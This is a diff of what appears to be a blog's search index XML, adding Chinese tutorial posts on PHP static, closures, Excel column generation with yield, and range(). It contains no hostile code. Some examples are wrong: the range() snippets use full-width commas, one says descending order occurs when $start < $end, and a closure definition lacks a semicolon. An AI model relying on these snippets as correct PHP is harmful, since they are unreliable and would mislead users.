@@ -4,6 +4,863 @@
   
     
     <entry>
+      <title><![CDATA[浅谈PHP中的static关键字]]></title>
+      <url>https://blog.palemoky.top/2019/09/18/%E6%B5%85%E8%B0%88PHP%E4%B8%AD%E7%9A%84static%E5%85%B3%E9%94%AE%E5%AD%97/</url>
+      <content type="html"><![CDATA[<h2 id="static-的几种使用情况："><a href="#static-的几种使用情况：" class="headerlink" title="static 的几种使用情况："></a>static 的几种使用情况：</h2><h3 id="1-静态变量"><a href="#1-静态变量" class="headerlink" title="1. 静态变量"></a>1. 静态变量</h3><p>静态变量仅在局部函数域中存在，但当程序执行离开此作用域时，其值并不丢失。看看下面的例子：</p>
+<pre><code class="php">&lt;?php
+function testStatic() {
+    static $val = 1;
+    echo $val;
+    $val++;
+}
+testStatic();   //output 1
+testStatic();   //output 2
+testStatic();   //output 3
+</code></pre>
+<p>如果不声明<code>static</code>，则每次<code>$val</code>的值都会初始化为1。这是由于<code>static</code>关键字会在请求初始化时存储与静态存储区，并存在于整个请求生命周期内，而普通变量则存在于栈区，函数执行结束时这些存储单元自动被释放。</p>
+<h3 id="2-静态属性"><a href="#2-静态属性" class="headerlink" title="2. 静态属性"></a>2. 静态属性</h3><pre><code class="php">class A {
+    public static $age;
+    public function roster () {
+        //...
+    }
+}
+</code></pre>
+<h3 id="3-静态方法"><a href="#3-静态方法" class="headerlink" title="3. 静态方法"></a>3. 静态方法</h3><pre><code class="php">class A {
+    public static $age;
+    public static function roster () {
+        //...
+    }
+}
+</code></pre>
+<h3 id="4-后期静态绑定"><a href="#4-后期静态绑定" class="headerlink" title="4. 后期静态绑定"></a>4. 后期静态绑定</h3><p>首先，后期静态绑定这个词怎么理解，官方手册对这个解释的很清楚，这里引用一下：『“后期绑定”的意思是说，static:: 不再被解析为定义当前方法所在的类，而是在实际运行时计算的。也可以称之为“静态绑定”，因为它可以用于（但<strong>不限于</strong>）静态方法的调用。』</p>
+<p>接下来，让我们用几个例子来具体说明一下：</p>
+<pre><code class="php">&lt;?php
+class A {
+    public static function who() {
+        echo __CLASS__;
+    }
+    public static function test() {
+        static::who(); // 后期静态绑定从这里开始
+    }
+}
+
+class B extends A {
+    public static function who() {
+        echo __CLASS__;
+    }
+}
+
+B::test();
+</code></pre>
+<p>这段代码的最终输出是什么？<code>A</code>还是<code>B</code>？<br>让我们来运行一下，发现结果是<code>B</code>。这是为什么呢？<br>因为当我们调用<code>B</code>中的静态方法<code>test()</code>时，B 中不存在，于是向上查找（调用查找顺序依次为 当前类 ==&gt; trait ==&gt; 父类），当在父类<code>A</code>中找到时，执行<code>static::who()</code>。（这里的<code>static</code>与我们常用的<code>self</code>关键字不同，如果是<code>self</code>，则只会向上查找，而<code>static</code>则会向下查找，具体调用方法也是在运行时确定的）因此接下来调用的是<code>B</code>中的 <code>who()</code>，而非<code>A</code>中的<code>who()</code>，最终也就自然输出为<code>B</code>。</p>
+<p>需要注意的是，后期静态绑定的解析会一直到取得一个完全解析了的静态调用为止(即最下层可执行的方法)。另一方面，如果静态调用使用 <code>parent::</code> 或者 <code>self::</code> 将转发调用信息。</p>
+<pre><code class="php">&lt;?php
+class A {
+    public static function foo() {
+        static::who();
+    }
+
+    public static function who() {
+        echo __CLASS__.&quot;\n&quot;;
+    }
+}
+
+class B extends A {
+    public static function test() {
+        A::foo();
+        parent::foo();
+        self::foo();
+    }
+
+    public static function who() {
+        echo __CLASS__.&quot;\n&quot;;
+    }
+}
+class C extends B {
+    public static function who() {
+        echo __CLASS__.&quot;\n&quot;;
+    }
+}
+
+C::test();// A C C
+</code></pre>
+<p>现在，让我们来看一下什么是<code>static</code>，什么时候该使用<code>static</code>。</p>
+<h2 id="什么是static？"><a href="#什么是static？" class="headerlink" title="什么是static？"></a>什么是static？</h2><p>如果我们在代码中声明了<code>static</code>关键字，代码在初始化阶段会与常量、全局变量一同存储在一段连续空间内（静态存储区），这会存在于整个请求周期，除非我们手动销毁。</p>
+<p>由于这些值是在初始化时确定的，相比于在运行时确定的值，就是“静态”(<code>static</code>)的。</p>
+<h2 id="什么时候用？"><a href="#什么时候用？" class="headerlink" title="什么时候用？"></a>什么时候用？</h2><p>由于是一段连续的空间，相比于运行时的碎片化产生的内容读取效率更高，所以，我们应将一些常用基础工具类设为静态，既避免了实例化时的资源消耗，有提升了书写体验。但要注意不能滥用<code>static</code>，曾经的一家知名公司内部项目model层全部是<code>static</code>方法，你能想象到这维护起来有多么让人崩溃。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a href="https://www.php.net/manual/zh/language.variables.scope.php" target="_blank" rel="noopener">使用静态变量 - PHP手册</a></li>
+<li><a href="https://www.php.net/manual/zh/language.oop5.late-static-bindings.php" target="_blank" rel="noopener">后期静态绑定 - PHP手册</a></li>
+</ol>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[浅谈php闭包/匿名函数]]></title>
+      <url>https://blog.palemoky.top/2019/09/18/%E6%B5%85%E8%B0%88php%E9%97%AD%E5%8C%85/</url>
+      <content type="html"><![CDATA[<p>闭包(Closure)，匿名函数（又名lambda表达式）是我们在编程中经常遇到的一个概念，但闭包究竟是什么？又有什么用呢？</p>
+<p>在编程中，闭包与匿名函数其实是不同的概念，但两者经常同时使用。在 PHP 中，二者的概念不做区分，下文均以闭包指代。</p>
+<h2 id="I-闭包是什么？"><a href="#I-闭包是什么？" class="headerlink" title="I. 闭包是什么？"></a>I. 闭包是什么？</h2><h3 id="闭包的常用类型"><a href="#闭包的常用类型" class="headerlink" title="闭包的常用类型"></a>闭包的常用类型</h3><p>闭包又名匿名函数，也就是没有函数名称的函数。我们先来看下常用类型</p>
+<pre><code class="php">// 定义一个闭包，并把它赋给变量 $closure
+$closure = function () {
+    return 7;
+}
+
+// 使用闭包也很简单
+$closure(); //这样就调用了闭包，输出 7
+
+// 如果要即时调用闭包，我们也可以这样写
+(function () {
+    echo 7;
+})();
+
+// 当然更多的时候是把闭包作为参数(回调函数)传递给函数
+function testClosure (Closure $callback) {
+    return $callback();
+}
+
+// $closure 作为参数传递给函数 testClosure，如果是普通函数是没有办法作为testClosure的参数的
+testClosure($closure);
+
+// 也可以直接将定义的闭包作为参数传递，而不用提前赋给变量
+testClosure (function () {
+    return 7;
+});
+
+// 闭包不止可以做函数的参数，也可以作为函数的返回值
+function getClosure () {
+    return function () { return 7; };
+}
+
+$c = getClosure(); // 函数返回的闭包就复制给 $c 了
+$c(); // 调用闭包，返回 7
+</code></pre>
+<h3 id="闭包类"><a href="#闭包类" class="headerlink" title="闭包类"></a>闭包类</h3><p>定义一个闭包函数，其实是产生了一个闭包类（Closure）的对象，Closure 类摘要如下：</p>
+<pre><code class="php">Closure {
+    // 用于禁止实例化的构造函数
+    __construct ( void )
+
+    // 复制一个闭包，绑定指定的$this对象和类作用域
+    public static bind ( Closure $closure , object $newthis [, mixed $newscope = &#39;static&#39; ] ) : Closure
+
+    // 复制当前闭包对象，绑定指定的$this对象和类作用域
+    public bindTo ( object $newthis [, mixed $newscope = &#39;static&#39; ] ) : Closure
+}
+</code></pre>
+<p>我们可以通过<code>var_dump($c instanceof Closure);</code>看到，闭包确实是<code>Closure</code>的一个实例，通过<code>var_dump(is_callable($c));</code>看到，闭包是<code>Callable</code>的数据类型。</p>
+<h4 id="Closure-bind-实例"><a href="#Closure-bind-实例" class="headerlink" title="Closure::bind() 实例"></a><code>Closure::bind()</code> 实例</h4><pre><code class="php">class Animal {  
+    private static $cat = &quot;cat&quot;;  
+    private $dog = &quot;dog&quot;;  
+    public $pig = &quot;pig&quot;;  
+}  
+
+/*  
+ * 获取Animal类静态私有成员属性 
+ */  
+$cat = static function() {  
+    return Animal::$cat;  
+};  
+
+/*  
+ * 获取Animal实例私有成员属性 
+ */  
+$dog = function() {  
+    return $this-&gt;dog;  
+};  
+
+/*  
+ * 获取Animal实例公有成员属性 
+ */  
+$pig = function() {
+    return $this-&gt;pig;
+};
+
+$bindCat = Closure::bind($cat, null, new Animal());// 给闭包绑定了Animal实例的作用域，但未给闭包绑定$this对象。这是由于静态闭包不能有绑定的对象（ newthis 参数的值应该设为 NULL）(详情请查看手册[Closure::bindTo页面文档](https://www.php.net/manual/zh/closure.bindto.php))
+
+$bindCat = Closure::bind($cat, new Animal(), &#39;Animal&#39;);// 若$cat不是静态闭包时有效
+
+$bindDog = Closure::bind($dog, new Animal(), &#39;Animal&#39;);// 给闭包绑定了Animal类的作用域，同时将Animal实例对象作为$this对象绑定给闭包  
+
+$bindPig = Closure::bind($pig, new Animal());// 将Animal实例对象作为$this对象绑定给闭包,保留闭包原有作用域  
+
+echo $bindCat(),PHP_EOL;// 根据绑定规则，允许闭包通过作用域限定操作符获取Animal类静态私有成员属性  
+
+echo $bindDog(),PHP_EOL;// 根据绑定规则，允许闭包通过绑定的$this对象(Animal实例对象)获取Animal实例私有成员属性  
+
+echo $bindPig(),PHP_EOL;// 根据绑定规则，允许闭包通过绑定的$this对象获取Animal实例公有成员属性
+
+// bindTo与bind类似，是面向对象的调用方式，这里只举一个，其他类比就可以
+$bindCat = $cat-&gt;bindTo(null, &#39;Animal&#39;);// 同样的，静态闭包不能绑定对象，因此$newthis为 null
+echo $bindCat(); // cat
+</code></pre>
+<blockquote>
+<p>如果未能指定作用域的范围，绑定后的闭包只能访问<code>public</code>属性的值。</p>
+</blockquote>
+<h4 id="Closure-bindTo-实例"><a href="#Closure-bindTo-实例" class="headerlink" title="Closure::bindTo() 实例"></a><code>Closure::bindTo()</code> 实例</h4><pre><code class="php">class A {
+    function __construct($val) {
+        $this-&gt;val = $val;
+    }
+
+    function getClosure() {
+        //returns closure bound to this object and scope
+        return function() { return $this-&gt;val; };
+    }
+}
+
+$ob1 = new A(1);
+$ob2 = new A(2);
+
+$cl = $ob1-&gt;getClosure();
+echo $cl(), PHP_EOL;// 1
+$cl = $cl-&gt;bindTo($ob2);// 它与当前对象的函数体相同、绑定了同样变量，但可以绑定不同的对象，也可以绑定新的类作用域
+echo $cl(), PHP_EOL;// 2
+</code></pre>
+<h2 id="II-闭包有什么用？"><a href="#II-闭包有什么用？" class="headerlink" title="II. 闭包有什么用？"></a>II. 闭包有什么用？</h2><h3 id="1-储存变量"><a href="#1-储存变量" class="headerlink" title="1. 储存变量"></a>1. 储存变量</h3><pre><code class="php">function makeHelloWorld($name) { 
+    $i = 0;
+    return function() use ($name, &amp;$i) { 
+        echo $name; $i++; echo $i.&quot;\n&quot;; }; 
+} 
+$hello1 = makeHelloWorld(&quot;wuying&quot;); 
+$hello2 = makeHelloWorld(&quot;wuying1&quot;); 
+$hello1(); //wuying1
+$hello1(); //wuying2
+$hello1(); //wuying3
+$hello2(); //wuying11
+</code></pre>
+<p>在这个示例中，<code>$hello1 = makeHelloWorld(&quot;wuying&quot;);</code>的作用是将参数<code>wuying1</code>传递给<code>makeHelloWorld()</code>，并接收其中的闭包作为返回值，因此，<code>$hello1</code>便成为了闭包，当我们执行<code>$hello1()</code>时，闭包开始执行。由于引用了闭包外的变量<code>$i</code>，所以每次的执行都修改了<code>$i</code>，所以最后依次输出了<code>wuying1</code>、<code>wuying2</code>、<code>wuying3</code>。</p>
+<p>那么，为什么闭包可以存储变量呢？这是因为在没有闭包的语言中，变量的生命周期只限于创建它的环境。但在有闭包的语言中，只要有一个闭包引用了这个变量，它就会一直存在。</p>
+<blockquote>
+<p>另一种在局部函数中储存变量的方式是使用<code>static</code>关键字，其原理是将变量存储于静态存储区，而非普通变量存储的栈区，详见另一篇文章<a href="">浅谈PHP中的static关键字</a>。</p>
+</blockquote>
+<h3 id="2-延时执行函数"><a href="#2-延时执行函数" class="headerlink" title="2. 延时执行函数"></a>2. 延时执行函数</h3><p>比如，我们在 JavaScript 中每隔 1 秒钟输出一个随机数</p>
+<pre><code class="javascript">setInterval(function(){console.log(Math.random())}, 1000)
+</code></pre>
+<p>在这个例子中，我们对闭包进行了多次调用，而且不是调用时即时执行。</p>
+<h3 id="3-对处理逻辑封装，形成更好的一体封装"><a href="#3-对处理逻辑封装，形成更好的一体封装" class="headerlink" title="3. 对处理逻辑封装，形成更好的一体封装"></a>3. 对处理逻辑封装，形成更好的一体封装</h3><p>如果在有闭包前，我们需要单独创建具名函数，然后使用名称引用这个函数</p>
+<pre><code class="php">&lt;?php
+$func = function($value) {
+    return $value * 2;
+};
+
+print_r(array_map($func, range(1, 5)));
+</code></pre>
+<p>但这样把回调与使用分离，而闭包的出现就很好的解决了这个问题。</p>
+<p>而由于闭包的封装性，闭包内无法访问包外变量，但我们可以通过<code>use</code>关键字来引入外部变量，如：</p>
+<pre><code class="php">$quantity = 10;
+function ($price) use ($quantity) {
+    return $price * $quantity;
+}
+</code></pre>
+<p>再来一个例子，使用闭包打印斐波那契数列。我们知道斐波那契数列有下面的规律：</p>
+<pre><code># f(n) 表示数列中第 n 个数的值
+f(n) = 0; (n = 0)
+f(n) = 1; (n = 1)
+f(n) = f(n-1)+f(n-2); (n &gt;= 2)
+</code></pre><p>使用递归的方法</p>
+<pre><code class="php">&lt;?php
+function fibonacci(int $n): int {
+    if ($n &lt; 2) {
+        return $n;
+    }
+    return fibonacci($n-1) + fibonacci($n-2);
+}
+
+echo fibonacci(10), &quot;\n&quot;; // 55
+</code></pre>
+<p>如果打印数列，那每一次都需要重复计算前面已经计算过的数据（只需要前两个就好）。可以使用闭包保存上一次的运行环境。</p>
+<p>php 版本</p>
+<pre><code class="php">&lt;?php
+$fibonacci = function (): callable {
+    $x = 0;
+    $y = 1;
+    return function () use (&amp;$x, &amp;$y): int {
+        list($x, $y) = [$y, $x+$y];
+        return $x;
+    };
+};
+
+$f = $fibonacci();
+
+for ($i = 0; $i &lt; 10; $i++) {
+    echo $f() , &quot;\n&quot;;
+}
+</code></pre>
+<p>js 版本</p>
+<pre><code class="javascript">let fibonacci = _ =&gt; {
+    let x = 0, y = 1;
+    return _ =&gt; {
+        [x, y] = [y, x+y];
+        return x;
+    };
+};
+
+let f = fibonacci();
+
+for (let i = 0; i &lt;= 10; i++) {
+    console.log(f());
+}
+</code></pre>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>合理使用闭包，能够让我们的代码更加清晰、更加灵活。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a href="https://xueyuanjun.com/post/4341.html/page/2#comments" target="_blank" rel="noopener">闭包和匿名函数-学院君</a></li>
+<li><a href="https://www.bilibili.com/video/av67412371" target="_blank" rel="noopener">闭包的编程思想-B站</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/闭包_(计算机科学" target="_blank" rel="noopener">闭包-维基百科</a>)</li>
+<li><a href="https://www.php.net/manual/zh/class.closure.php" target="_blank" rel="noopener">Closure类-PHP手册</a></li>
+<li><a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">Callable-PHP手册</a></li>
+<li><a href="https://learnku.com/articles/4625/php-closure-closure" target="_blank" rel="noopener">PHP 闭包（Closure）-LearKu</a></li>
+<li><a href="https://learnku.com/articles/7469/learn-the-closure-function-closures" target="_blank" rel="noopener">学习一下闭包函数 - LearKu</a></li>
+</ol>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Excel导出问题]]></title>
+      <url>https://blog.palemoky.top/2019/09/12/Excel%E5%AF%BC%E5%87%BA%E9%97%AE%E9%A2%98/</url>
+      <content type="html"><![CDATA[<p>我们在工作中经常会遇到 Excel 导出的问题，比如：</p>
+<ol>
+<li>表格内容的填充</li>
+<li>下载数据过大执行超时、内存溢出</li>
+<li>异步导出</li>
+</ol>
+<p>那么，这些问题应该怎样解决呢？</p>
+<h1 id="1-表格内容的填充"><a href="#1-表格内容的填充" class="headerlink" title="1. 表格内容的填充"></a>1. 表格内容的填充</h1><p>我们知道，在 PHP 中，<a href="https://www.php.net/manual/en/function.ord.php" target="_blank" rel="noopener"><code>ord()</code></a>可将字符转换为 ASCII 码，<a href="https://www.php.net/manual/en/function.chr.php" target="_blank" rel="noopener"><code>chr()</code></a>则可以将 ASCII 码转换为对应字符，二者为互补函数。</p>
+<p>通过查看 Excel，我们知道一个 sheet 中，列序号是 <code>A1, B1, C1 ...</code>递增的，而行序号是<code>A2, A3, A4...</code>递增的。</p>
+<h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><pre><code class="php">$rawData = [
+    [
+        &#39;name&#39; =&gt; &#39;张三&#39;,
+        &#39;gender&#39; =&gt; &#39; 男&#39;,
+        &#39;age&#39; =&gt; 19,
+        &#39;birthday&#39; =&gt; &#39;2000-01-01&#39;
+    ],
+    [
+        &#39;name&#39; =&gt; &#39;李四&#39;,
+        &#39;gender&#39; =&gt; &#39;男&#39;,
+        &#39;age&#39; =&gt; 29,
+        &#39;birthday&#39; =&gt; &#39;1990-01-01&#39;
+    ]
+];
+
+//拼装导出数据
+$sheetData = [
+    &#39;姓名&#39; =&gt; array_column($rawData, &#39;name&#39;),
+    &#39;性别&#39; =&gt; array_column($rawData, &#39;gender&#39;),
+    &#39;年龄&#39; =&gt; array_column($rawData, &#39;age&#39;),
+    &#39;生日&#39; =&gt; array_column($rawData, &#39;birthday&#39;),
+];
+
+$excelObj = new \PHPExcel();
+$sheet    = $excelObj-&gt;getActiveSheet();
+
+//生成导出表格
+$i = 65;//A 在 ASCII 中的十进制为 65
+foreach ($sheetData as $title =&gt; $datum) {
+    //填充表头
+    $row = chr($i++);
+    $sheet-&gt;setCellValue($row . &#39;1&#39;, $title);
+
+    //填充内容
+    $j = 2;
+    foreach ($datum as $item) {
+        $sheet-&gt;setCellValueExplicit($row . $j++, $item);
+    }
+}
+</code></pre>
+<p>优点：可随导出内容自适应，扩展性强</p>
+<p>缺点：表头只能兼容到<code>A1~Z1</code>，超过<code>Z1</code>则会触发 bug 而无法导出</p>
+<h1 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h1><p>针对方案一的缺点，我们来扩展表头的容量，利用PHP中的字符串递增来生成表头。</p>
+<pre><code class="php">&lt;?php
+for($i = &#39;A&#39;; $i &lt;= &#39;Z&#39;; $i++) {
+    echo $i . &#39;1&#39;, PHP_EOL;
+}
+</code></pre>
+<p>优点：简单快速生成表头</p>
+<p>缺点：只能兼容到<code>YZ1</code></p>
+<p>在 Microsoft Office 365 2019 中，最大列为<code>XFD</code>，所以，如果要满足 Excel 的导出，我们可以这样完全兼容：</p>
+<pre><code class="php">&lt;?php
+$alphabet = [];
+for($i = &#39;A&#39;; $i &lt; &#39;ZZZ&#39;; $i++) {
+    $alphabet[] = $i . &#39;1&#39;;
+}
+</code></pre>
+<p>好了，现在我们已经能够完全满足 Excel 的列需求了，但这里还有一点小瑕疵：我们生成的所有数据都存储在数组中，这显然是对内存的极大浪费，应该按需存取。我们再来尝试另一种新的方式：</p>
+<pre><code class="php">&lt;?php
+function getAlphabet() {
+    for ($i = &#39;A&#39;; $i &lt; &#39;ZZZ&#39;; $i++) {
+        yield $i;
+    }
+}
+
+foreach (getAlphabet() as $letter) {
+    echo $letter . &#39;1&#39;;
+}
+</code></pre>
+<p>现在优雅了许多。但这种方式和上一种有什么区别呢？请注意这段代码中的<code>yield</code>关键字，这是生成迭代器。我们可以理解为每当 CPU 执行到<code>yield</code>关键字时，就会暂存当前的上下文，并将控制权交回<code>foreach</code>，而不像普通函数调用一次调用结束后销毁上下文（所以我们需要将函数所产生的变量进行返回），这让我们得以在每次需要到这段函数时，都可以从上次停下的位置继续，而无需暂存整个函数的处理结果，从而节省了内存空间。通过<code>memory_get_usage()</code>函数可以看到，上一种实现方式需要<code>1.9MB</code>，而<code>yield</code>只需要<code>287.6KB</code>，二者的空间复杂度分别为<code>O(n)</code>和<code>O(1)</code>。</p>
+<h1 id="方案三"><a href="#方案三" class="headerlink" title="方案三"></a>方案三</h1><p>虽然上述两种方案已经能够满足正常的需求，而且实现也足够简单。但我们还是要探索一下是否能够解决上述缺陷的方式，这样，这个问题就演变成了二十六进制的字符计数器。</p>
+<p>思路：我们常见的有二进制、八进制、十进制、十六进制，所以我们就可以照猫画虎，写一个二十六进制。通过观察，这些进制均是末位递增，当末位为最大值时，向上一位进位，并将低位复位。那就让我们把想法转换为代码吧：</p>
+<pre><code class="php">&lt;?php
+function getAlphabet($data)
+{
+    $letter = [];
+    for ($i = 65, $count = 0; $i &lt; 95; $i++) {
+        // 末位递增处理
+        if ($i &gt; 64 &amp;&amp; $i &lt; 91) {
+            $lastPlace = chr($i);
+        }
+
+        //进位处理
+        if (90 === $i) {
+            $letter[] = substr(end($letter), 0, -1) . chr($i);
+
+            // 所有位均为Z时，位数+1
+            if (substr_count(end($letter), &#39;Z&#39;) === strlen(end($letter))) {
+                $letter[] = implode(&#39;&#39;, [&#39;A&#39;, str_repeat(&#39;A&#39;, strlen(end($letter)))]);
+            } else {
+                // 同位数下递增
+                $letter[] = chr(ord(substr(end($letter), 0, 1)) + 1) . &#39;A&#39;;
+                /*
+                 * 此种情况下如何进行递增检测处理？如 AXZ 递增后应为 AYA，如何保证随着位数的递增不会消耗更多的时间？
+                 */
+            }
+
+            // 进位完成后将计数器归位
+            $i = 65;
+        } else {
+            // 递增低位
+            $letter[] = substr_replace(end($letter), $lastPlace, -1, 1);
+        }
+
+        if (empty($letter)) {
+            $letter[] = &#39;A&#39;;
+        }
+
+        if ($count &gt; count($data)) {
+            break;
+        } else {
+            $count++;
+        }
+    }
+
+    return $letter;
+}
+
+echo json_encode(getAlphabet(range(1,100)));
+</code></pre>
+<p>emmmm，看起来离我们的目标又近了一步：可以连续生成一段字母，并且可以根据我们的数据长度自适应，但是！多位进位如何处理，如何保障多进位处理的性能问题？关于这个问题，目前的想法是参照<a href="https://www.ruanyifeng.com/blog/2011/03/4-bit_computer.html" target="_blank" rel="noopener">计算机的进位实现思想</a>，先挖个坑，等搞清楚来填:)</p>
+<h1 id="2-导出内容过大"><a href="#2-导出内容过大" class="headerlink" title="2. 导出内容过大"></a>2. 导出内容过大</h1><p>很多项目初期的数据量很小，Excel 导出非常快，但随着数据量的增加，导出越来越慢，直到超时、内存溢出。怎样才能开发一个一劳永逸的导出呢？<br>我们知道，PHPExcel（新版为 PhpSpreadsheet)支持向 Excel 中追加内容，所以，我们依然可以使用<code>yield</code>保证内存：比如内存可以承载 1 万条数据的容量，我们就可以使用 yield 先处理 1 万条暂存于内存中，然后再将这 1 万条追加入磁盘的 Excel 文件，这样既保证了内存的使用，有保证了处理效率。</p>
+<h1 id="3-异步导出"><a href="#3-异步导出" class="headerlink" title="3. 异步导出"></a>3. 异步导出</h1><p>众所周知，PHP 是阻塞式语言，从而导致一些交互后产生的长时间执行的任务难以处理。如果对于一些小型的异步任务通过 crontab 执行，则可能导致后期的定时任务越来越多而难以管理，而 PHP 中的<a href="https://www.php.net/manual/en/function.fastcgi-finish-request.php" target="_blank" rel="noopener"><code>fastcgi_finish_request()</code></a>可以使客户端结束连接后，需要大量时间运行的任务能够继续运行，正好满足我们轻量的异步执行需求。但该方式也会有一些问题，如该方式无错误重试机制。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
+<li><a href="http://www.laruence.com/2010/07/30/1682.html" target="_blank" rel="noopener">注意PHP对字符串的递增运算</a></li>
+<li><a href="https://www.php.net/manual/zh/class.generator.php" target="_blank" rel="noopener">生成器 - PHP手册</a></li>
+<li><a href="https://www.php.net/manual/zh/language.generators.syntax.php" target="_blank" rel="noopener">yield关键字 - PHP手册</a></li>
+<li><a href="https://www.ruanyifeng.com/blog/2011/03/4-bit_computer.html" target="_blank" rel="noopener">四位计算机的原理及实现 - 阮一峰</a></li>
+<li><a href="https://tyloafer.github.io/posts/63198/" target="_blank" rel="noopener">PHP如何读取大文件</a></li>
+</ol>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[【转】鲜为人知的 PHP range() 函数]]></title>
+      <url>https://blog.palemoky.top/2019/09/12/%E9%B2%9C%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84-PHP-range-%E5%87%BD%E6%95%B0/</url>
+      <content type="html"><![CDATA[<p>作为一个 PHPer ，如果想要你生成 [1,31] 区间的 31 个数字，你一般会怎么做？</p>
+<p>仔细想想，好好回忆一下，你第一时间想到的，会不会是使用一个 for 循环来生成，就像下面这样</p>
+<pre><code class="php">$days = array();
+
+for($i = 1; $i &lt;= 31; $i++ ) {
+    $days[] = $i;
+}
+</code></pre>
+<p>我想，应该，很少人会使用 <code>range()</code> 函数来生成<code>$days = range(1,31,1);</code></p>
+<p>我不知道这是不是我们 PHPer 的悲剧，因为，似乎，很少有教程会交代可以使用 <code>foreach(range())</code> 的方式来代替 <code>for</code> 循环。</p>
+<p>其实，PHP 中的 <code>range()</code> 函数比 Python 中的 <code>range()</code> 强大多了，除了没有使用生成器的方式。</p>
+<h1 id="range-函数"><a href="#range-函数" class="headerlink" title="range() 函数"></a>range() 函数</h1><p>根据官方文档，<code>range()</code> 函数被归纳为 「 数组函数 」，因为它的结果就是产生一个数组，一个普通数组。</p>
+<p><code>range()</code> 函数的原型如下</p>
+<p><code>array range ( mixed $start , mixed $end [, number $step = 1 ] )</code><br>range() 函数根据范围 <code>[$start,$end]</code> 创建一个数组，步长为 <code>$step</code> ，默认步长为 <code>1</code></p>
+<blockquote>
+<p>注意： 返回的区间是一个左闭右闭的区间，也就是包含了 $start 和 $end 两个值。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>start</td>
+<td>返回的数组区间序列的第一个值</td>
+</tr>
+<tr>
+<td>end</td>
+<td>返回的数组区间序列结束于 end 的值</td>
+</tr>
+<tr>
+<td>step</td>
+<td>如果设置了步长 step，会被作为单元之间的步进值。step 应该为 正值。不设置 step 则默认为 1。</td>
+</tr>
+</tbody>
+</table>
+<h1 id="用法一-：-start-和-end-参数都是整数"><a href="#用法一-：-start-和-end-参数都是整数" class="headerlink" title="用法一 ： $start 和 $end 参数都是整数"></a>用法一 ： $start 和 $end 参数都是整数</h1><ol>
+<li><p>返回整数区间 [0,12] 且步长为 1 的数组</p>
+<pre><code class="php">// array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12)
+foreach (range(0, 12) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+<li><p>返回整数区间 [0,100] 且步长为 10 的数组</p>
+<pre><code class="php">// array(0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100)
+foreach (range(0, 100, 10) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+<li><p>返回整数区间 [0,99] 且步长为 10 的数组</p>
+<pre><code class="php">// array(0, 10, 20, 30, 40, 50, 60, 70, 80, 90)
+foreach (range(0, 99, 10) as $number) {
+ echo $number, &quot; &quot; ;
+}
+</code></pre>
+</li>
+</ol>
+<blockquote>
+<p>注意：返回的数组的最后一个值为 90 ，因为 100 &lt; 99 ，所以不满足条件</p>
+</blockquote>
+<ol start="4">
+<li><p>如果步长为负数，那么会取该步长的绝对值</p>
+<pre><code class="php">// array(0, 2, 4, 6, 8, 10, 12)
+foreach (range(0, 12，2) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+<li><p>如果 $start &lt; $end，那么返回的数组会从大到小</p>
+<pre><code class="php">// array(12, 10, 8, 6, 4, 2, 0)
+foreach (range(12, 0，2) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+<li><p>如果步长 $step 为 0 ，会抛出一个异常</p>
+<pre><code class="php">// Warning: range(): step exceeds the specified range
+var_dump(range(12, 0, 0));
+</code></pre>
+</li>
+<li><p>如果步长为字符串，那么会使用 <code>intval()</code> 转换为整数，如果转换后的结果为 0，则参考 6</p>
+<pre><code class="php">// array(12, 10, 8, 6, 4, 2, 0)
+foreach (range(12, 0，&#39;2a&#39;) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+</ol>
+<h1 id="用法二-：-start-和-end-参数可以是整数也可以是浮点数，-step-也可以是浮点数"><a href="#用法二-：-start-和-end-参数可以是整数也可以是浮点数，-step-也可以是浮点数" class="headerlink" title="用法二 ： $start 和 $end 参数可以是整数也可以是浮点数，$step 也可以是浮点数"></a>用法二 ： <code>$start</code> 和 <code>$end</code> 参数可以是整数也可以是浮点数，$step 也可以是浮点数</h1><ol>
+<li><p><code>$start</code> 和 <code>$end</code> 是浮点数，而 <code>$step</code> 是整数，结果和整数是类似的</p>
+<pre><code class="php">// array(12.8, 10.8, 8.8, 6.8, 4.8, 2.8)
+foreach (range(12.8, 2.2，2) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+<li><p><code>$start</code> 和 <code>$end</code> 是浮点数，且 <code>$step</code> 也是浮点数，结果和整数也是类似的</p>
+<pre><code class="php">// array(12.8, 10.3, 7.8, 5.3, 2.8)
+foreach (range(12.8, 2.2，2.5) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+<li><p>如果步长为字符串，那么会使用 <code>doubleval()</code> 转换为浮点数，如果步长为 <code>0.0</code> 那么将抛出异常</p>
+<pre><code class="php">// array(12.8, 10.3, 7.8, 5.3, 2.8)
+foreach (range(12.8, 2.2，&#39;2.5&#39;) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+</ol>
+<p>转换后步长为 0 则抛出异常</p>
+<pre><code class="php">// Warning: range(): step exceeds the specified range
+foreach (range(12.8, 2.2，&#39;a2.5&#39;) as $number) {
+    echo $number;
+}
+</code></pre>
